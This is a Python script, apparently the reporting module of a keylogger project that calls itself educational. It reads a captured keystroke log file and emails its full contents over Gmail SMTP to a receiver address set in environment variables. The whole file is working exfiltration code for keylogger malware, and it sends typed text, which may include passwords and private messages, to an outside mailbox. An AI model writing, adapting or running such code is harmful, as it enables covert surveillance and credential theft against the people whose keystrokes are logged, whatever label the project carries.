import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import os
from dotenv import load_dotenv

load_dotenv()

EMAIL_ADDRESS = os.getenv("EMAIL_ADDRESS")
EMAIL_PASSWORD = os.getenv("EMAIL_PASSWORD")
RECEIVER_EMAIL = os.getenv("RECEIVER_EMAIL")

def send_log_email(log_file="keylog.txt"):
    if not os.path.exists(log_file):
        print("[-] No log file found to send.")
        return
    
    with open(log_file, "r") as f:
        log_content = f.read()
    
    if not log_content.strip():
        print("[*] Log file is empty, nothing to send.")
        return
    
    msg = MIMEMultipart()
    msg["From"] = EMAIL_ADDRESS
    msg["To"] = RECEIVER_EMAIL
    msg["Subject"] = "Keylogger Report - Educational Project"
    
    body = MIMEText(log_content, "plain")
    msg.attach(body)
    
    try:
        with smtplib.SMTP("smtp.gmail.com", 587) as server:
            server.starttls()
            server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
            server.send_message(msg)
        print("[+] Email sent successfully!")
    except Exception as e:
        print(f"[-] Failed to send email: {e}")

if __name__ == "__main__":
    send_log_email()

